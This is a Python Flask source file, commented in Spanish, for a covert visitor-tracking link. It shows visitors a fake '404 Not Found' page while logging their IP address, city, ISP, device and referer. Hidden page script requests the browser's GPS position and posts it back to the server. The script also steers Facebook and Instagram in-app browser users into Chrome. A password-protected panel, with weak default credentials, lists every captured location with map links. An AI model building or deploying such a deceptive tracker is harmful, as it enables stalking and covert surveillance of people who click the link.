
from flask import Flask, request, Response
from datetime import datetime
import requests
import os

app = Flask(__name__)

visitas = []
gps_data = []

# 🔐 Credenciales
USUARIO = os.environ.get("USER", "admin")
PASSWORD = os.environ.get("PASS", "1234")

# 🔐 Auth
def check_auth(username, password):
    return username == USUARIO and password == PASSWORD

def authenticate():
    return Response(
        'Acceso restringido', 401,
        {'WWW-Authenticate': 'Basic realm="Login requerido"'}
    )

def require_auth(f):
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# 🌐 Obtener IP real
def obtener_ip_real():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return ip.split(',')[0].strip()

# 🌍 Info IP
def obtener_info_ip(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        return {
            "pais": res.get("country", "Desconocido"),
            "ciudad": res.get("city", "Desconocido"),
            "isp": res.get("isp", "Desconocido"),
            "lat": res.get("lat", 0),
            "lon": res.get("lon", 0)
        }
    except:
        return {"pais":"?","ciudad":"?","isp":"?","lat":0,"lon":0}

# 📱 Detectar dispositivo
def detectar_dispositivo(user_agent):
    ua = user_agent.lower()
    if "mobile" in ua:
        return "📱 Móvil"
    elif "tablet" in ua:
        return "📟 Tablet"
    else:
        return "💻 PC"

# 🏠 Página principal
@app.route("/")
def inicio():
    ip = obtener_ip_real()
    tipo = "IPv6" if ":" in ip else "IPv4"
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info = obtener_info_ip(ip)

    user_agent = request.headers.get('User-Agent', 'N/A')
    idioma = request.headers.get('Accept-Language', 'N/A')
    referer = request.headers.get('Referer', 'Directo')
    dispositivo = detectar_dispositivo(user_agent)

    mapa = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"

    visitas.append({
        "ip": ip,
        "tipo": tipo,
        "fecha": fecha,
        "pais": info["pais"],
        "ciudad": info["ciudad"],
        "isp": info["isp"],
        "lat": info["lat"],
        "lon": info["lon"],
        "mapa": mapa,
        "dispositivo": dispositivo,
        "idioma": idioma,
        "referer": referer,
        "user_agent": user_agent
    })

    # 🔥 BLOQUEO AGRESIVO FACEBOOK
    return """
    <script>
    var ua = navigator.userAgent.toLowerCase();

    if (ua.includes("fbav") || ua.includes("fban") || ua.includes("instagram")) {

        document.body.innerHTML = `
        <div style="background:#000;color:#fff;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:sans-serif;">
            <h1>⚠️ Abrir en navegador</h1>
            <p>Este contenido no está disponible aquí</p>
            <p>Ábrelo en Chrome o tu navegador</p>

            <button onclick="abrirChrome()" style="padding:15px 25px;font-size:18px;margin-top:20px;">
                Abrir en Chrome
            </button>

            <br><br>

            <button onclick="copiar()" style="padding:10px 20px;">
                Copiar enlace
            </button>
        </div>
        `;
    }

    function abrirChrome() {
        var url = window.location.href.replace(/^https?:\\/\\//, '');
        window.location.href = "googlechrome://" + url;
    }

    function copiar() {
        navigator.clipboard.writeText(window.location.href);
        alert("Link copiado, ábrelo en tu navegador");
    }
    </script>

    <h1>404 Not Found</h1>

    <script>
    // GPS (solo si acepta)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch("/guardar_gps", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                })
            });
        });
    }
    </script>
    """, 404

# 📍 Guardar GPS
@app.route("/guardar_gps", methods=["POST"])
def guardar_gps():
    data = request.json
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    gps_data.append({
        "lat": data.get("lat"),
        "lon": data.get("lon"),
        "fecha": fecha
    })

    return "OK"

# 🔐 Panel admin
@app.route("/admin")
@require_auth
def admin():

    tabla = ""
    for v in visitas:
        tabla += f"""
        <tr>
            <td>{v['ip']}</td>
            <td>{v['tipo']}</td>
            <td>{v['fecha']}</td>
            <td>{v['pais']}</td>
            <td>{v['ciudad']}</td>
            <td>{v['isp']}</td>
            <td>{v['lat']}, {v['lon']}</td>
            <td><a href="{v['mapa']}" target="_blank">🌎</a></td>
            <td>{v['dispositivo']}</td>
            <td>{v['idioma']}</td>
            <td>{v['referer']}</td>
        </tr>
        """

    tabla_gps = ""
    for g in gps_data:
        link = f"https://www.google.com/maps?q={g['lat']},{g['lon']}"
        tabla_gps += f"""
        <tr>
            <td>{g['lat']}</td>
            <td>{g['lon']}</td>
            <td>{g['fecha']}</td>
            <td><a href="{link}" target="_blank">📍</a></td>
        </tr>
        """

    return f"""
    <h1>Panel Privado 🔐</h1>

    <h2>🌐 Datos por IP</h2>
    <table border="1">
        <tr>
            <th>IP</th>
            <th>Tipo</th>
            <th>Fecha</th>
            <th>País</th>
            <th>Ciudad</th>
            <th>ISP</th>
            <th>Coords</th>
            <th>Mapa</th>
            <th>Dispositivo</th>
            <th>Idioma</th>
            <th>Referer</th>
        </tr>
        {tabla}
    </table>

    <br><br>

    <h2>📍 GPS Preciso</h2>
    <table border="1">
        <tr>
            <th>Lat</th>
            <th>Lon</th>
            <th>Fecha</th>
            <th>Mapa</th>
        </tr>
        {tabla_gps}
    </table>
    """

# 🚀 Run
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
